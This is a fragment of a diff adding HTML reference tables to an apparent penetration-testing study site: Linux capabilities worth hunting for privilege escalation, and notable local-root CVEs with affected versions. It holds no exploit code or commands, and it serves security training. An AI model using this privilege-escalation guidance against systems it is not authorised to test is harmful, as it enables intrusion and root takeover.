+            <p class="pc-ref-empty" data-ref-empty="gtfobins" hidden>No match. Try a format name, a value, or clear the filter.</p>
+          </div>
+        </section>
+        <section class="pc-ref" id="pcref-caps-abuse" aria-labelledby="pcref-caps-abuse-title">
+          <div class="pc-ref-head">
+            <h2 id="pcref-caps-abuse-title">Linux capabilities worth hunting</h2>
+            <p class="pc-ref-intro">What each capability grants when set on a binary via getcap. cap_setuid is the clearest win. Filter by capability.</p>
+          </div>
+          <div class="pc-ref-search" role="search">
+            <label class="pc-ref-label" for="pcref-caps-abuse-q">Filter linux capabilities worth hunting</label>
+            <input class="tool-input pc-ref-input" id="pcref-caps-abuse-q" type="search" autocomplete="off" placeholder="raw-md5, ntlm, zip&hellip;" data-ref-filter="caps-abuse" />
+            <span class="pc-ref-count" data-ref-count="caps-abuse" aria-live="polite"></span>
+          </div>
+          <div class="pc-ref-wrap">
+            <table class="pc-ref-table" data-ref-table="caps-abuse">
+              <thead><tr><th scope="col">Capability</th><th scope="col">What it enables</th></tr></thead>
+              <tbody>
+                <tr data-search="cap_setuid+ep the binary can set its uid to 0: on an interpreter (python/perl), instant root"><td><code>cap_setuid+ep</code></td><td>The binary can set its UID to 0: on an interpreter (python/perl), instant root</td></tr>
+                <tr data-search="cap_setgid+ep set gid: escalate group membership"><td><code>cap_setgid+ep</code></td><td>Set GID: escalate group membership</td></tr>
+                <tr data-search="cap_dac_read_search+ep bypass read permission checks: read any file, including /etc/shadow"><td><code>cap_dac_read_search+ep</code></td><td>Bypass read permission checks: read any file, including /etc/shadow</td></tr>
+                <tr data-search="cap_dac_override+ep bypass all file permission checks: write any file"><td><code>cap_dac_override+ep</code></td><td>Bypass all file permission checks: write any file</td></tr>
+                <tr data-search="cap_sys_admin+ep broad admin operations (mount, namespaces); many abuse paths"><td><code>cap_sys_admin+ep</code></td><td>Broad admin operations (mount, namespaces); many abuse paths</td></tr>
+                <tr data-search="cap_sys_ptrace+ep attach to and inject into any process, including root processes"><td><code>cap_sys_ptrace+ep</code></td><td>Attach to and inject into any process, including root processes</td></tr>
+                <tr data-search="cap_chown+ep change file ownership; chain to take over a root-owned file"><td><code>cap_chown+ep</code></td><td>Change file ownership; chain to take over a root-owned file</td></tr>
+              </tbody>
+            </table>
+            <p class="pc-ref-empty" data-ref-empty="caps-abuse" hidden>No match. Try a format name, a value, or clear the filter.</p>
+          </div>
+        </section>
+        <section class="pc-ref" id="pcref-kernel-cves" aria-labelledby="pcref-kernel-cves-title">
+          <div class="pc-ref-head">
+            <h2 id="pcref-kernel-cves-title">Notable local-root kernel / tool CVEs</h2>
+            <p class="pc-ref-intro">Well-known local privilege escalations to match against uname -r and the installed tooling. Confirm the version before running any exploit. Filter by name.</p>
+          </div>
+          <div class="pc-ref-search" role="search">
+            <label class="pc-ref-label" for="pcref-kernel-cves-q">Filter notable local-root kernel / tool cves</label>
+            <input class="tool-input pc-ref-input" id="pcref-kernel-cves-q" type="search" autocomplete="off" placeholder="raw-md5, ntlm, zip&hellip;" data-ref-filter="kernel-cves" />
+            <span class="pc-ref-count" data-ref-count="kernel-cves" aria-live="polite"></span>
+          </div>
+          <div class="pc-ref-wrap">
+            <table class="pc-ref-table" data-ref-table="kernel-cves">
+              <thead><tr><th scope="col">Name</th><th scope="col">CVE</th><th scope="col">Affected</th></tr></thead>
+              <tbody>
+                <tr data-search="pwnkit cve-2021-4034 pkexec (polkit), most distros 2009 onward"><td>pwnkit</td><td>CVE-2021-4034</td><td>pkexec (Polkit), most distros 2009 onward</td></tr>
+                <tr data-search="dirtypipe cve-2022-0847 linux kernel 5.8 to 5.16.11 / 5.15.25 / 5.10.102"><td>DirtyPipe</td><td>CVE-2022-0847</td><td>Linux kernel 5.8 to 5.16.11 / 5.15.25 / 5.10.102</td></tr>
+                <tr data-search="dirtycow cve-2016-5195 kernels before ~4.8.3; copy-on-write race"><td>DirtyCow</td><td>CVE-2016-5195</td><td>Kernels before ~4.8.3; copy-on-write race</td></tr>
+                <tr data-search="baron samedit cve-2021-3156 sudo before 1.9.5p2; heap overflow, any local user"><td>Baron Samedit</td><td>CVE-2021-3156</td><td>sudo before 1.9.5p2; heap overflow, any local user</td></tr>
+                <tr data-search="overlayfs cve-2021-3493 ubuntu overlayfs, kernel up to 5.11"><td>OverlayFS</td><td>CVE-2021-3493</td><td>Ubuntu overlayfs, kernel up to 5.11</td></tr>
+                <tr data-search="looney tunables cve-2023-4911 glibc ld.so tunables, 2021-2023 releases"><td>Looney Tunables</td><td>CVE-2023-4911</td><td>glibc ld.so tunables, 2021-2023 releases</td></tr>
+                <tr data-search="nf_tables cve-2024-1086 kernel netfilter use-after-free, 5.14 to 6.6"><td>nf_tables</td><td>CVE-2024-1086</td><td>Kernel netfilter use-after-free, 5.14 to 6.6</td></tr>
+              </tbody>
+            </table>
+            <p class="pc-ref-empty" data-ref-empty="kernel-cves" hidden>No match. Try a format name, a value, or clear the filter.</p>
+          </div>
+        </section>
+      </main>
+      <footer class="site-footer site-footer-unified"><div class="footer-brand"><strong>Paracausal Telemetry</strong><blockquote class="footer-quote"><p>&ldquo;Curiouser and curiouser.&rdquo;</p><span class="footer-quote-cite">Lewis Carroll</span></blockquote></div><div class="footer-nav-groups"><div class="footer-nav-group"><span>Explore</span><nav class="footer-links" aria-label="Primary footer navigation"><a href="/writeups/">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/field-guides/">Field guides</a><a href="/talks/">Talks</a><a href="/#observer">Observer</a><a href="/#threat-actors">Threat Actors</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav></div></div><p class="footer-note"><span>paracausaltelemetry.com</span><span>2026</span></p></footer>
+    </div>
+    <script type="module" src="/cpts/password-cracking/pc-map.js?v=pc1"></script>
+  </body>
+</html>
